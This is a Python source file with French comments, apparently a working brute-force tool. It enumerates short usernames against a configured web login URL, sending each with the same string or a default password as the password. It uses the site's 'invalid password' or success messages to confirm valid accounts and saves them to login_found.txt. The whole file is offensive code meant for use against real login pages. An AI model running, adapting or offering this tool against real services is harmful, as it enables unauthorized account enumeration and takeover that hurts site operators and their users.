from .config import env
import time 
import urllib.request as rq

class Crack:
    def __init__(self,rec):
        self.num_login_found=0
        self.rec=rec
        self.lettre_optimiz='qwertyuiopasdfghjklzxcvbnm'
        self.num_optimiz='0123456789'
        self.Lettre_optimiz='QWERTYUIOPASDFGHJKLZXCVBNM'
        self.special_optimiz='~!@#$%^&*()_+{`}"|?><:;\'[]=-\\'
        self.space_optimiz=' '
        self.out_file_name = "login_found.txt"
        self.num_login_found=0
        self.lettre_len=len(self.lettre_optimiz)-1
        self.Lettre_len=len(self.Lettre_optimiz)-1
        self.num_len=len(self.num_optimiz)-1
        self.special_len=len(self.special_optimiz)-1
        self.lettre=self.lettre_optimiz+self.num_optimiz+self.space_optimiz
        self.long=self.lettre_len
        self.bou=1
        self.repo5=4
        self.num=env.username_length
        self.long2=0
        self.long3=0
        self.x,self.y,self.z,self.u ,self.v=0,0,0,0,0, 

        
    def run(self):
        # algo pour traiter les decalage
        if self.rec==1:
            self.long2=0
            self.long3=2
        elif 2<=self.rec<=36:
            self.long2=self.rec
            self.long3=self.rec+2
        self.x=self.long2
        while 1:
            self.bou=1
            self.t1=time.time()
            self.user=(self.lettre[self.x]+self.lettre[self.y]+self.lettre[self.z]+self.lettre[self.u]+self.lettre[self.v])
            self.x+=1
            # coeur du moteur... va permettre la generation ordonner des logins
            if self.x==self.long3:
                self.x=self.long2
                self.y+=1
                if self.num==1:
                        break
                else:
                        pass
            elif self.y==self.long:
                self.x=self.long2
                self.y=0
                self.z+=1
                if self.num==2:
                        break
                else:
                        pass
            elif self.z==self.long:
                self.x=self.long2
                self.y=0
                self.z=0
                self.u+=1
                if self.num==3:
                        break
                else :
                        pass
            elif self.u==self.long:
                self.x=self.long2
                self.y=0
                self.z=0
                self.u=0
                self.v+=1
                if self.num==4:
                        break
                else :
                        pass 
            elif self.v==self.long:
                self.x=self.long2
                self.y=0
                self.z=0
                self.u=0
                self.v=0
                if self.num==5:
                        break
                else :
                        pass 

            # envoye ; reception ; et traitement automatique des requetes HTTP
            while self.bou==1:
                if env.username_is_password==True:
                    self.password=self.user
                else :
                    self.password = env.default_password
                try:
                    self.req=env.url+'?'+env.login+'='+str(self.user)+'&'+env.psw+'='+str(self.password)
                    self.r=rq.urlopen(self.req)
                    self.bou = 0
                except:
                    print("connexion perdu, reconnexion...",end="\r")
            # algo pour calculer le debit du bruteforce
            self.t2=time.time()
            self.t4=int(((self.t2-self.t1)*(36**3))//60)
            self.t3=int((1/(self.t2-self.t1))*18)
            # les logins corrects seront automatiquement ecrit dans un fichier nommer login_found.txt
            if env.invalid_password_error_msg in str(self.r.read()) or env.success_message in str(self.r.read()):
                self.num_login_found+=1
                print(self.user+"\n")
                with open(self.out_file_name,'a') as f:
                    f.write(self.user+"\n")
            else :
                print("login {} incorrect ||  {}  login/sec || {} min restant ".format(self.user,self.t3,self.t4),end="\r")
